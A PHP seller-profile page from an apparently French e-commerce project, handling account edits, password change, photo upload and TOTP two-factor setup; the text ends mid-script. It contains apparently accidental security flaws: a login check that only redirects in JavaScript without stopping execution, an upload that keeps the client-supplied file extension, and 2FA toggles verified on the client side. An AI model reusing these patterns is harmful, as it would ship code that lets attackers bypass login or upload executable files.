<?php
session_start();
require_once(__DIR__."/../../../vendor/autoload.php");
use OTPHP\TOTP;
use OTPHP\Factory;
include '../../../selectBDD.php'; 

if(empty($_SESSION['vendeur_id']) === false){
  $vendeur_id = $_SESSION['vendeur_id'];
}else{
?>

<script>
alert("Vous n'êtes pas connecté. Vous allez être redirigé vers la page de connexion.");
document.location.href = "/pages/backoffice/connexionVendeur/index.php";
</script>
<?php
}

$_SESSION['creerArticle'] = [];
$_SESSION['remise'] = [];

$notification = null;
if (isset($_GET['success'])) {
    $notification = ['message' => "Informations enregistrées avec succès !", 'type' => 'success'];
} elseif (isset($_GET['error_email'])) {
    $notification = ['message' => $_GET['error_email'], 'type' => 'error'];
} elseif (isset($_GET['error_siren'])) {
    $notification = ['message' => $_GET['error_siren'], 'type' => 'error'];
} elseif (isset($_GET['error_rsociale'])) {
    $notification = ['message' => $_GET['error_rsociale'], 'type' => 'error'];
} elseif (isset($_GET['error_pseudo'])) {
    $notification = ['message' => $_GET['error_pseudo'], 'type' => 'error'];
} elseif (isset($_GET['error_num'])) {
    $notification = ['message' => $_GET['error_num'], 'type' => 'error'];
}   

function check_same_string($a, $b) {
    return $a === $b;
}

function valueExists($pdo, $table, $column, $value, $excludeId = null, $excludeColumn = null) {
    $sql = "SELECT COUNT(*) FROM $table WHERE $column = :value";

    // exclure l'utilisateur courant (évite les faux positifs)
    if ($excludeId !== null && $excludeColumn !== null) {
        $sql .= " AND $excludeColumn != :excludeId";
    }

    $stmt = $pdo->prepare($sql);

    $params = ['value' => $value];

    if ($excludeId !== null && $excludeColumn !== null) {
        $params['excludeId'] = $excludeId;
    }

    $stmt->execute($params);
    return $stmt->fetchColumn() > 0;
}


$vendeur_id = $_SESSION['vendeur_id'];

try {
    $query = "
        SELECT
            v.denomination AS pseudo,
            v.raison_sociale AS rsociale,
            v.siren AS siren,
            c.id_compte AS compte,
            c.mdp,
            c.email AS email,
            c.num_telephone AS telephone,
            c.prenom as prenom,
            c.nom as nom,
            c.civilite as civilite,
            a.a_adresse AS adresse,
            a.a_numero AS numero,
            a.a_code_postal AS codep,
            a.a_ville AS ville,
            a.a_complement AS complement,
            a.latitude AS latitude,
            a.longitude AS longitude,
            i.id_image,
            i.i_lien AS image
        FROM cobrec1._compte c
        LEFT JOIN cobrec1._vendeur v ON c.id_compte = v.id_compte
        LEFT JOIN cobrec1._adresse a ON v.id_compte = a.id_compte
        LEFT JOIN cobrec1._represente_compte r ON c.id_compte = r.id_compte
        LEFT JOIN cobrec1._image i ON r.id_image = i.id_image
        WHERE v.id_vendeur = :id
    ";

    $stmt = $pdo->prepare($query);
    $stmt->execute(['id' => $vendeur_id]);
    $old = $stmt->fetch(PDO::FETCH_ASSOC); // récupère la ligne unique

    if (!$old) {
        die("Impossible de récupérer les informations du vendeur.");
    }

    $vendeur = $old; // utiliser pour préremplir le formulaire


} catch (PDOException $e) {
    die("Erreur lors de la récupération des informations : " . htmlspecialchars($e->getMessage()));
}

/* ---------------------------------------------------------
   TRAITEMENT DES FORMULAIRES
--------------------------------------------------------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    /* ---------------------------------------------------------
    TRAITEMENT DU CHANGEMENT DE MDP 
    --------------------------------------------------------- */
    if (isset($_POST['change_password'])) {

        $old = trim($_POST['old_password']);
        $new = trim($_POST['new_password']);
        $confirm = trim($_POST['confirm_password']);

        // Récupération du mot de passe actuel en BDD
        $stmt = $pdo->prepare("SELECT mdp FROM cobrec1._compte WHERE id_compte = :id");
        $stmt->execute(['id' => $vendeur['compte']]);
        $oldPasswordDB = $stmt->fetchColumn();

        // Vérifier que l'ancien mot de passe est correct
        if (!password_verify($old, $oldPasswordDB)) {
            header("Location: index.php?password_error=" . urlencode("L'ancien mot de passe est incorrect."));
            exit;
        }

        // Vérifier que les nouveaux mots de passe correspondent
        if ($new !== $confirm) {
            header("Location: index.php?password_error=" . urlencode("Les nouveaux mots de passe ne correspondent pas."));
            exit;
        }

        if (!empty($_SESSION['OTPvendeur']['statut'])){
            $otp_saisi = $_POST['code_OTP'] ?? '';
            $stmt = $pdo->prepare("SELECT secret_otp, etat_otp FROM cobrec1._compte WHERE id_compte = :compte");
            $stmt->execute([':compte' => $vendeur['compte']]);
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            $otp = TOTP::createFromSecret($row['secret_otp']);
            if (!(($row['etat_otp'] == 'true' && $otp->verify(str_replace(' ', '', $otp_saisi), null, 20)))){
                header("Location: index.php?password_error=" . urlencode("Le code A2F est faux."));
                exit;
            }
        }

        // Mise à jour du mot de passe en clair
        $stmt = $pdo->prepare("
            UPDATE cobrec1._compte
            SET mdp = :new
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'new' => password_hash($new, PASSWORD_DEFAULT),
            'id'  => $vendeur['compte']
        ]);

        header("Location: index.php?password_success=1");
        exit;

    }

    /* ---------------------------------------------------------
       2. Mise à jour table _compte
    --------------------------------------------------------- */
    // NOM
    if (isset($_POST['nom']) && $_POST['nom'] !== $old['nom']) { 

        $stmt = $pdo->prepare("
            UPDATE cobrec1._compte
            SET nom = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['nom']),
            'id'  => $vendeur['compte']
        ]);
    }

    // PRENOM
    if (isset($_POST['prenom']) && $_POST['prenom'] !== $old['prenom']) {

        $stmt = $pdo->prepare("
            UPDATE cobrec1._compte
            SET prenom = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['prenom']),
            'id'  => $vendeur['compte']
        ]);
    }

    // CIVILITE
    if (isset($_POST['civilite']) && $_POST['civilite'] !== $old['civilite']) {

        $stmt = $pdo->prepare("
            UPDATE cobrec1._compte
            SET civilite = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['civilite']),
            'id'  => $vendeur['compte']
        ]);
    }

    // EMAIL
    if (isset($_POST['email']) && $_POST['email'] !== $old['email']) {
        
        if (valueExists($pdo, "cobrec1._compte", "email", trim($_POST['email']), $vendeur['compte'], "id_compte")) {
            header("Location: index.php?error_email=" . urlencode("Cet email est déjà utilisé."));
            exit;
        }

        
        $stmt = $pdo->prepare("
            UPDATE cobrec1._compte
            SET email = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['email']),
            'id'  => $vendeur['compte']
        ]);
    }

    // TÉLÉPHONE
    if (isset($_POST['telephone']) && $_POST['telephone'] !== $old['telephone']) {
        
        if (valueExists($pdo, "cobrec1._compte", "num_telephone", trim($_POST['telephone']), $vendeur['compte'], "id_compte")) {
            header("Location: index.php?error_num=" . urlencode("Ce numéro de téléphone est déjà utilisé."));
            exit;
        }
        
        $stmt = $pdo->prepare("
            UPDATE cobrec1._compte
            SET num_telephone = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['telephone']),
            'id'  => $vendeur['compte']
        ]);
    }



    /* ---------------------------------------------------------
       3. Mise à jour table _adresse
    --------------------------------------------------------- */

    // ADRESSE
    if (isset($_POST['adresse']) && $_POST['adresse'] !== $old['adresse']) {
        $stmt = $pdo->prepare("
            UPDATE cobrec1._adresse
            SET a_adresse = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['adresse']),
            'id'  => $vendeur['compte']
        ]);
    }

    // NUMERO
    if (isset($_POST['numero']) && $_POST['numero'] !== $old['numero']) {
        $stmt = $pdo->prepare("
            UPDATE cobrec1._adresse
            SET a_numero = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['numero']),
            'id'  => $vendeur['compte']
        ]);
    }

    // VILLE
    if (isset($_POST['ville']) && $_POST['ville'] !== $old['ville']) {
        $stmt = $pdo->prepare("
            UPDATE cobrec1._adresse
            SET a_ville = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['ville']),
            'id'  => $vendeur['compte']
        ]);
    }
    

    // CODE POSTAL
    if (isset($_POST['codep']) && $_POST['codep'] !== $old['codep']) {
        $stmt = $pdo->prepare("
            UPDATE cobrec1._adresse
            SET a_code_postal = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['codep']),
            'id'  => $vendeur['compte']
        ]);
    }

    // COMPLEMENT
    if (isset($_POST['complement']) && $_POST['complement'] !== $old['complement']) {
        $stmt = $pdo->prepare("
            UPDATE cobrec1._adresse
            SET a_complement = :val
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['complement']),
            'id'  => $vendeur['compte']
        ]);
    }


    /* ---------------------------------------------------------
      4. Mise à jour de l'image du vendeur
    --------------------------------------------------------- */
    if (isset($_FILES['image']) && $_FILES['image']['error'] === UPLOAD_ERR_OK) {

        // Dossier cible
        $uploadDir = "../../../img/photo/";

        // Nom unique
        $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
        $filename = "vendeur_id_" . $vendeur['compte'] . "." . $ext;

        // Chemin final disque
        $filePath = $uploadDir . $filename;

        // Déplace le fichier
        if (move_uploaded_file($_FILES['image']['tmp_name'], $filePath)) {

            // Chemin à enregistrer dans la BDD
            $dbPath = "/img/photo/" . $filename;

            // Récupérer ancienne image pour la supprimer
            $oldImagePathDB = $vendeur['image'];  
            $oldImagePathDisk = str_replace("/img/photo", "../../../img/photo", $oldImagePathDB);

            // Supprimer l'ancienne image si elle existe ET si ce n’est pas une image par défaut
            if (!empty($oldImagePathDB) && file_exists($oldImagePathDisk)) {
                unlink($oldImagePathDisk);
            }

            // Mise à jour du lien dans _image
            $stmt = $pdo->prepare("
                UPDATE cobrec1._image
                SET i_lien = :lien
                WHERE id_image = :img
            ");
            $stmt->execute([
                'lien' => $dbPath,
                'img'  => $vendeur['id_image']
            ]);
        }
    }

    /* ---------------------------------------------------------
       1. Mise à jour table _vendeur
    --------------------------------------------------------- */

    // PSEUDO
    if (isset($_POST['pseudo']) && $_POST['pseudo'] !== $old['pseudo']) {

        if (valueExists($pdo, "cobrec1._vendeur", "denomination", trim($_POST['pseudo']), $vendeur_id, "id_vendeur")) {
            header("Location: index.php?error_pseudo=" . urlencode("Ce pseudo est déjà utilisé."));
            exit;
        }

        $stmt = $pdo->prepare("
            UPDATE cobrec1._vendeur
            SET denomination = :val
            WHERE id_vendeur = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['pseudo']),
            'id'  => $vendeur_id
        ]);
    }

    // RAISON SOCIALE
    if (isset($_POST['rsociale']) && $_POST['rsociale'] !== $old['rsociale']) {

        if (valueExists($pdo, "cobrec1._vendeur", "raison_sociale", trim($_POST['rsociale']), $vendeur_id, "id_vendeur")) {
            header("Location: index.php?error_rsociale=" . urlencode("Cette raison sociale existe déjà."));
            exit;
        }

        $stmt = $pdo->prepare("
            UPDATE cobrec1._vendeur
            SET raison_sociale = :val
            WHERE id_vendeur = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['rsociale']),
            'id'  => $vendeur_id
        ]);
    }

    // SIREN
    if (isset($_POST['siren']) && $_POST['siren'] !== $old['siren']) {

        if (valueExists($pdo, "cobrec1._vendeur", "siren", trim($_POST['siren']), $vendeur_id, "id_vendeur")) {
            header("Location: index.php?error_siren=" . urlencode("Ce numéro SIREN est déjà enregistré."));
            exit;
        }

        $stmt = $pdo->prepare("
            UPDATE cobrec1._vendeur
            SET siren = :val
            WHERE id_vendeur = :id
        ");
        $stmt->execute([
            'val' => trim($_POST['siren']),
            'id'  => $vendeur_id
        ]);
    }

    /* ---------------------------------------------------------
       5. Mise à jour des coordonnées GPS
    --------------------------------------------------------- */
    if (isset($_POST['latitude']) && isset($_POST['longitude']) &&
        $_POST['latitude'] !== '' && $_POST['longitude'] !== '') {
        $stmt = $pdo->prepare("
            UPDATE cobrec1._adresse
            SET latitude = :lat, longitude = :lon
            WHERE id_compte = :id
        ");
        $stmt->execute([
            'lat' => (float)$_POST['latitude'],
            'lon' => (float)$_POST['longitude'],
            'id'  => $vendeur['compte']
        ]);
    }

    /* ---------------------------------------------------------
       Redirection
    --------------------------------------------------------- */
    $url = '/pages/backoffice/profil/index.php';
    echo '<!doctype html><html lang="fr"><head><meta http-equiv="refresh" content="0;url=' . $url . '">';
    exit;
}

function safe($array, $key, $default = "") {
    return htmlspecialchars(isset($array[$key]) ? $array[$key] : $default);
}

// Récupération du thème de daltonisme depuis la session
$current_theme = isset($_SESSION['colorblind_mode']) ? $_SESSION['colorblind_mode'] : 'default';
?>

<!doctype html>
<html lang="fr" <?php echo ($current_theme !== 'default') ? 'data-theme="' . htmlspecialchars($current_theme) . '"' : ''; ?>>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=1440, height=1024">
    <title>Profil Vendeur - Alizon</title>
    <link rel="icon" type="image/png" href="../../../img/favicon.svg">
    <link rel="stylesheet" href="/styles/ProfilVendeur/profil.css">
    <!-- <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" /> -->
    <script src="../../../js/accessibility.js"></script>
</head>

<body>
    <div class="app">

        <?php include __DIR__ . '/../../../partials/aside.html'; ?>

        <main class="main">
            <div class="page-header">
                <h1 class="page-title">Mon Compte</h1>

                <a href="../connexionVendeur/index.php" class="logout-btn">Déconnexion</a>
            </div>
            <div class="profil-card">
                <h2 class="profil-card__title">Modifier mes informations</h2>

                <div class="profil-photo">
                    <img src="<?= str_replace("/img/photo", "../../../img/photo" , htmlspecialchars($vendeur['image']))?>"
                        alt="Photo vendeur">
                </div>

                <form id="edit-form" class="edit-form" action="" method="POST" enctype="multipart/form-data">

                    <div class="form-row">
                        <label>Changer l'image</label>
                        <input type="file" name="image" accept="image/*">
                    </div>

                    <div class="form-group-row">
                        <div class="form-row">
                            <label>Nom</label>
                            <input type="text" id="nom" name="nom" value="<?= safe($vendeur, 'nom') ?>" required>
                            <span class="error" id="error-nom"></span>
                        </div>
                        <div class="form-row">
                            <label>Prénom</label>
                            <input type="text" id="prenom" name="prenom" value="<?= safe($vendeur, 'prenom') ?>"
                                required>
                            <span class="error" id="error-prenom"></span>
                        </div>
                    </div>

                    <div class="form-group-row">
                        <div class="form-row" style="flex: 0 0 150px;"> <label>Civilité</label>
                            <select name="civilite" id="civilite" required>
                                <option value="">-- Sélectionnez --</option>
                                <option value="M."
                                    <?php echo (safe($vendeur, 'civilite') ?? '') === 'M.' ? 'selected' : ''; ?>>M.
                                </option>
                                <option value="Mme"
                                    <?php echo (safe($vendeur, 'civilite') ?? '') === 'Mme' ? 'selected' : ''; ?>>Mme
                                </option>
                                <option value="Inconnu"
                                    <?php echo (safe($vendeur, 'civilite') ?? '') === 'Inconnu' ? 'selected' : ''; ?>>
                                    Inconnu</option>
                            </select>
                        </div>

                        <div class="form-row">
                            <label>Téléphone</label>
                            <input type="text" id="telephone" name="telephone"
                                value="<?= safe($vendeur, 'telephone') ?>" required>
                            <span class="error" id="error-telephone"></span>
                        </div>
                    </div>

                    <div class="form-row">
                        <label>Dénomination</label>
                        <input type="text" id="pseudo" name="pseudo" value="<?= safe($vendeur, 'pseudo') ?>" required>
                        <span class="error" id="error-pseudo"></span>
                    </div>

                    <div class="form-row">
                        <label>Raison sociale</label>
                        <input type="text" id="rsociale" name="rsociale" value="<?= safe($vendeur, 'rsociale') ?>"
                            required>
                        <span class="error" id="error-rsociale"></span>
                    </div>

                    <div class="form-group-row">
                        <div class="form-row">
                            <label>Email</label>
                            <input type="email" id="email" name="email" value="<?= safe($vendeur, 'email') ?>" required>
                            <span class="error" id="error-email"></span>
                        </div>

                        <div class="form-row form-row--small">
                            <label>SIREN</label>
                            <input type="text" id="siren" name="siren" value="<?= safe($vendeur, 'siren') ?>" required>
                            <span class="error" id="error-siren"></span>
                        </div>
                    </div>

                    <div class="form-group-row">
                        <div class="form-row form-row--small">
                            <label>Numéro de rue</label>
                            <input type="text" id="numero" name="numero" value="<?= safe($vendeur, 'numero') ?>"
                                required>
                            <span class="error" id="error-numero"></span>
                        </div>

                        <div class="form-row">
                            <label>Adresse</label>
                            <input type="text" id="adresse" name="adresse" value="<?= safe($vendeur, 'adresse') ?>"
                                required>
                            <span class="error" id="error-adresse"></span>
                        </div>
                    </div>

                    <div class="form-row">
                        <label>Complément d'adresse</label>
                        <input type="text" id="complement" name="complement"
                            value="<?= safe($vendeur, 'complement') ?>">
                        <span class="error" id="error-complement"></span>
                    </div>

                    <div class="form-group-row">
                        <div class="form-row">
                            <label>Ville</label>
                            <input type="text" id="ville" name="ville" value="<?= safe($vendeur, 'ville') ?>" required>
                            <span class="error" id="error-ville"></span>
                        </div>

                        <div class="form-row form-row--small">
                            <label>Code postal</label>
                            <input type="text" id="codep" name="codep" value="<?= safe($vendeur, 'codep') ?>" required>
                            <span class="error" id="error-codep"></span>
                        </div>
                    </div>

                    <!-- ===== SECTION GPS ===== -->
                    <!-- <div class="form-row" style="gap: 10px; display: flex; flex-wrap: wrap;">
                        <button type="button" id="btn-geocode" class="btn btn--secondary">
                            Valider les coordonnées GPS
                        </button>
                        <button type="button" id="btn-geolocate" class="btn btn--secondary">
                            Me géolocaliser
                        </button>
                    </div>

                    <div id="gps-result" style="display:none; margin-top: 12px;">
                        <div class="form-group-row">
                            <div class="form-row form-row--small">
                                <label>Latitude</label>
                                <input type="number" step="any" id="latitude" name="latitude"
                                    value="<?//= htmlspecialchars($vendeur['latitude'] ?? '') ?>"
                                    placeholder="ex : 47.218371">
                            </div>
                            <div class="form-row form-row--small">
                                <label>Longitude</label>
                                <input type="number" step="any" id="longitude" name="longitude"
                                    value="<?//= htmlspecialchars($vendeur['longitude'] ?? '') ?>"
                                    placeholder="ex : -1.553621">
                            </div>
                        </div>
                        <div id="map"
                            style="height: 320px; border-radius: 8px; margin-top: 10px; border: 1px solid #ddd;"></div>
                        <p style="font-size: 0.83em; color: #666; margin-top: 6px;">
                            Vous pouvez faire glisser le marqueur ou cliquer sur la carte pour ajuster la position.
                        </p>
                    </div> -->

                    <button title="Enregistrer" class="btn btn--primary" type="submit">Enregistrer</button>
                </form>
            </div>

            <!-- ===== FORMULAIRE DE MODIFICATION DU MOT DE PASSE ===== -->

            <!-- POPUP DE SUCCÈS -->
            <div id="popup-success" class="popup-success">
                Mot de passe modifié avec succès !
            </div>

            <!-- POPUP DE SUCCÈS -->
            <div id="popup-error" class="popup-error">
                <span id="popup-error-text"></span>
            </div>

            <div class="profil-card mt-4">

                <h2 class="profil-card__title">Modifier mon mot de passe</h2>

                <form id="form-password" method="POST" class="edit-form">

                    <div class="form-row password-field">
                        <label for="old_password">Ancien mot de passe</label>
                        <input type="password" id="old_password" name="old_password" required>
                        <span class="toggle-pwd" onclick="togglePassword('old_password', this)">
                            <img src="../../../img/svg/oeil.svg" alt="Voir/Masquer" />
                        </span>
                    </div>

                    <div class="form-row password-field">
                        <label for="new_password">Nouveau mot de passe</label>
                        <input type="password" id="new_password" name="new_password" required>
                        <span class="toggle-pwd" onclick="togglePassword('new_password', this)">
                            <img src="../../../img/svg/oeil.svg" alt="Voir/Masquer" />
                        </span>
                    </div>

                    <div class="form-row password-field">
                        <label for="confirm_password">Confirmer le mot de passe</label>
                        <input type="password" id="confirm_password" name="confirm_password" required>
                        <span class="toggle-pwd" onclick="togglePassword('confirm_password', this)">
                            <img src="../../../img/svg/oeil.svg" alt="Voir/Masquer" />
                        </span>
                    </div>

                    <div class="form-row mdpOTP" style='display: <?php
                            if (empty($_SESSION['OTPvendeur']['statut'])){ echo 'none'; } else{ echo 'block';} ?>'>
                        <label for="code_OTP">Code d'authentification à double facteurs</label>
                        <input type="text" inputmode="numeric" pattern="[0-9]{3} [0-9]{3}" min="7" max="7" placeholder="123 456" name="code_OTP">
                    </div>



                    <button title="Modifier mon mot de passe" class="btn btn--primary" type="submit"
                        name="change_password">Modifier mon mot de passe</button>

                </form>
            </div>

            <div class="profil-card">

                <h2 class="profil-card__title">Authentification à double facteurs</h2>

                <form id="form-OTP" method="POST" class="edit-form">
                    <button type="button" id="activerOTP" class="btn btn--primary" onclick="ouvrirModalOTP()">
                        <span class="btn-text-desktop">Activer l'authentification à doubles facteurs</span>
                    </button>
                    <button type="button" id="desactiverOTP" class="btn btn--primary" onclick="ouvrirModalDesactivationOTP()">
                        <span class="btn-text-desktop">Désactiver l'authentification à doubles facteurs</span>
                    </button>
                    <?php 
                    if (!empty($_SESSION['OTPvendeur']['statut'])){?>
                        <script> 
                        document.getElementById("activerOTP").disabled = true; 
                        document.getElementById("desactiverOTP").disabled = false; 
                        </script><?php
                    }else{?>
                        <script> 
                        document.getElementById("activerOTP").disabled = false;
                        document.getElementById("desactiverOTP").disabled = true;
                        </script>
                    <?php } ?>
                </form>
                <br>
                <div id="modalOTP">
        <div>
            <h2 class="profil-card__title">Authentification à doubles facteurs</h2>
            <?php
                include_once '../../connexionClient/OTP.php';
                $_SESSION['OTPvendeur']['secret'] = $otp->getSecret();
                ?>
            <form id="otpform">
                <div>
                    <img src='<?php echo $result->getDataUri() ?>' width="250em" height="250em">
                    <label>Code secret :
                        <small><?php echo $otp->getSecret() ?></small>
                    </label>
                </div>
                <input type="text" inputmode="numeric" pattern="[0-9]{3} [0-9]{3}" min="7" max="7" placeholder="123 456" name="code" />
                <button type="button" onclick="fermerModalOTP()">Annuler</button>
                <button type="submit">Valider</button>
            </form>
            <script>
            document.getElementById('otpform').addEventListener('submit', function(event) {
                event.preventDefault();
                const formData = new FormData(event.target);
                const code = formData.get('code');

                const xhttp = new XMLHttpRequest();
                xhttp.open("POST", "../../../pages/connexionClient/ajax_otp.php", true);
                xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                xhttp.send("code=" + code + '&send=1');


                const xhttp2 = new XMLHttpRequest();
                xhttp2.open("GET", "../../../pages/connexionClient/ajax.txt", true);
                xhttp2.send();
                xhttp2.onreadystatechange = () => {
                    if (xhttp2.readyState === xhttp2.HEADERS_RECEIVED) {
                        const contentLength = xhttp2.getResponseHeader("Content-Length");
                        if (contentLength == 4) {
                            xhttp2.abort();
                            alert(
                                "Authentification à doubles facteurs activée avec succès."
                                );
                            //document.location.href = "/index.php"; 
                            document.getElementById('modalOTP').style.display = 'none';

                            const xhttp3 = new XMLHttpRequest();
                            xhttp3.open("POST", "../../../pages/connexionClient/statut_otp.php", true);
                            xhttp3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                            xhttp3.send("statutOTP=active&send=1");
                            succesOTP();
                        } else {
                            alert("Echec. Veuillez réessayer.");
                        }
                    }
                };
            });
            </script>
        </div>
    </div>

    <div id="modalDesactivationOTP">
        <div>
            <h2 class="profil-card__title">Désactiver l'authentification à doubles facteurs</h2>
            <form>
                <label>
                    <p>Code secret :</p>
                </label>
                <input type="text" inputmode="numeric" pattern="[0-9]{3} [0-9]{3}" min="7" max="7" placeholder="123 456" name="code" />
                <button type="button" onclick="fermerModalDesactivationOTP()">Annuler</button>
                <button type="submit">Valider</button>
            </form>
            <script>
                document.querySelector("#modalDesactivationOTP form").addEventListener('submit', function(event) {
                    event.preventDefault();
                    const formData = new FormData(event.target);
                    const code = formData.get('code');

                    const xhttp = new XMLHttpRequest();
                    xhttp.open("POST", "../../../pages/ProfilClient/verif_code.php", true);
                    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    xhttp.send("code=" + code + '&send=1');


                    const xhttp2 = new XMLHttpRequest();
                    xhttp2.open("GET", "../../../pages/ProfilClient/verif_code.txt", true);
                    xhttp2.send();
                    xhttp2.onreadystatechange = () => {
                        if (xhttp2.readyState === xhttp2.HEADERS_RECEIVED) {
                            const contentLength = xhttp2.getResponseHeader("Content-Length");
                            if (contentLength == 4) {
                                xhttp2.abort();
                                alert(
                                    "Authentification à doubles facteurs désactivée avec succès."
                                    );
                                //document.location.href = "/index.php"; 
                                document.getElementById('modalDesactivationOTP').style.display = 'none';
                                succesDesactOTP();
                            } else {
                                alert("Echec. Veuillez réessayer.");
                            }
                        }
                    };
                });
                </script>
            </div>
            </div>
            </div>

            <script>
                //fonction pour fermer le modal de la double authentification (OTP)
                function fermerModalOTP() {
                    //cache le modal OTP
                    document.getElementById('modalOTP').style.display = 'none';
                }

                //fonction pour fermer le modal de désactivation de la double authentification (OTP)
                function fermerModalDesactivationOTP() {
                    //cache le modal OTP
                    document.getElementById('modalDesactivationOTP').style.display = 'none';
                }

                function ouvrirModalOTP() {
                    document.getElementById('modalOTP').style.display = 'block';
                }

                function ouvrirModalDesactivationOTP() {
                    document.getElementById('modalDesactivationOTP').style.display = 'block';
                }

                function succesOTP() {
                    document.getElementById('activerOTP').textContent = "Authentification à doubles facteurs activée avec succès.";
                    document.getElementById('activerOTP').disabled = true;
                    document.querySelector('.mdpOTP').style.display = 'block';

                    document.getElementById('desactiverOTP').textContent = "Désactiver l'authentification à doubles facteurs ?";
                    document.getElementById('desactiverOTP').disabled = false;        
                }

                function succesDesactOTP() {
                    document.getElementById('desactiverOTP').textContent = "Authentification à doubles facteurs désactivée.";
                    document.getElementById('desactiverOTP').disabled = true;
                    document.querySelector('.mdpOTP').style.display = 'none';

                    document.getElementById('activerOTP').textContent = "Activer l'authentification à doubles facteurs.";
                    document.getElementById('activerOTP').disabled = false;
                }
            </script>


            <div class="daltonien-switcher">
                <label for="colorblind-mode">Mode daltonien :</label>
                <select id="colorblind-mode" class="filtre__item">
                    <option value="default" <?= $current_theme === 'default' ? 'selected' : '' ?>>Désactivé</option>
                    <option value="dalto-red-green" <?= $current_theme === 'dalto-red-green' ? 'selected' : '' ?>>Rouge/Vert (Protan/Deutan)</option>
                    <option value="dalto-blue-yellow" <?= $current_theme === 'dalto-blue-yellow' ? 'selected' : '' ?>>Bleu/Jaune (Tritan)</option>
                </select>
            </div>
        </main>
    </div>
    <script>

    document.querySelectorAll("input[placeholder='123 456']").forEach(champOTP => {
        champOTP.addEventListener("input", function() {
            let valeur = this.value;
            valeur = valeur.replace(/\D/g, "");
            valeur = valeur.replace(/(.{3})/g, "$1 ").trim();
            this.value = valeur;
        });
    });

    function ouvrirModalOTP() {
        document.getElementById('modalOTP').style.display = 'block';
    }

    function ouvrirModalDesactivationOTP() {
        document.getElementById('modalDesactivationOTP').style.display = 'block';
    }

    function succesOTP() {
        document.getElementById('activerOTP').textContent = "Authentification à doubles facteurs activée avec succès.";
        document.getElementById('activerOTP').disabled = true;
        document.querySelector('.mdpOTP').style.display = 'block';

        document.getElementById('desactiverOTP').textContent = "Désactiver l'authentification à doubles facteurs ?";
        document.getElementById('desactiverOTP').disabled = false;        
    }

    function succesDesactOTP() {
        document.getElementById('desactiverOTP').textContent = "Authentification à doubles facteurs désactivée.";
        document.getElementById('desactiverOTP').disabled = true;
        document.querySelector('.mdpOTP').style.display = 'none';

        document.getElementById('activerOTP').textContent = "Activer l'authentification à doubles facteurs.";
        document.getElementById('activerOTP').disabled = false;
    }

    // REGEX
    const regex = {
        nom: /^[a-zA-ZÀ-ÿ' -]{2,50}$/,
        prenom: /^[a-zA-ZÀ-ÿ' -]{2,50}$/,
        pseudo: /^[a-zA-Z0-9 _-]{2,30}$/,
        civilite: /M.|Mme|Inconnu/,
        rsociale: /^[a-zA-Z0-9À-ÿ' -]{2,50}$/,
        siren: /^[0-9]{9}$/,
        email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
        telephone: /^(?:\+33|0)[1-9](?:[0-9]{8})$/,
        numero: /^([1-9]{0,13}( ){0,1}(bis|ter|quater|quinquies|sexies|septies|octies|nonies){0,1})$/,
        adresse: /^[0-9a-zA-ZÀ-ÿ,' .-]{3,80}$/,
        ville: /^[a-zA-ZÀ-ÿ' -]{2,50}$/,
        codep: /^((0[1-9])|([1-8][0-9])|(9[0-7])|(2A)|(2B)) *([0-9]{3})?$/,
        complement: /^[0-9a-zA-ZÀ-ÿ,' .-]{0,80}$/
    };

    // Fonction de validation pour un champ
    function validateField(id) {
        const field = document.getElementById(id);
        const error = document.getElementById("error-" + id);
        const pattern = regex[id];

        if (!field) return;

        const value = field.value.trim();

        // Si champ vide → pas d’erreur visuelle
        if (value === "") {
            field.classList.remove("invalid", "valid");
            error.textContent = "";
            return;
        }

        // Si correspond
        if (pattern.test(value)) {
            field.classList.remove("invalid");
            field.classList.add("valid");
            error.textContent = "";
        } else {
            field.classList.remove("valid");
            field.classList.add("invalid");
            error.textContent = "Valeur invalide pour " + id;
        }
    }

    // Liste des champs à vérifier
    const fields = [
        "nom",
        "prenom",
        "civilite",
        "pseudo",
        "rsociale",
        "siren",
        "email",
        "telephone",
        "numero",
        "adresse",
        "ville",
        "codep",
        "complement"
    ];

    // Activation de la validation live
    fields.forEach(id => {
        let field = document.getElementById(id);
        if (field) {
            field.addEventListener("input", () => validateField(id));
        }
    });

    // REGEX pour mot de passe sécurisé : 1 maj, 1 min, 1 chiffre, 8+ caractères
    const regexPwd = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;

    // Validation du nouveau mot de passe
    document.getElementById("new_password").addEventListener("input", function() {
        const field = this;
        const error = document.getElementById("error-new_password");

        if (regexPwd.test(field.value)) {
            field.classList.add("valid");
            field.classList.remove("invalid");
            error.textContent = "";
        } else {
            field.classList.remove("valid");
            field.classList.add("invalid");
            error.textContent =
                "Min 8 caractères, 1 majuscule, 1 minuscule, 1 chiffre et un caractère spéciale.";
        }
    });

    // Validation de la confirmation
    document.getElementById("confirm_password").addEventListener("input", function() {
        const newPwd = document.getElementById("new_password").value;
        const field = this;
        const error = document.getElementById("error-confirm_password");

        if (field.value === newPwd && field.value !== "") {
            field.classList.add("valid");
            field.classList.remove("invalid");
            error.textContent = "";
        } else {
            field.classList.remove("valid");
            field.classList.add("invalid");
            error.textContent = "Les mots de passe ne correspondent pas.";
        }
    });

    const urlParams = new URLSearchParams(window.location.search);

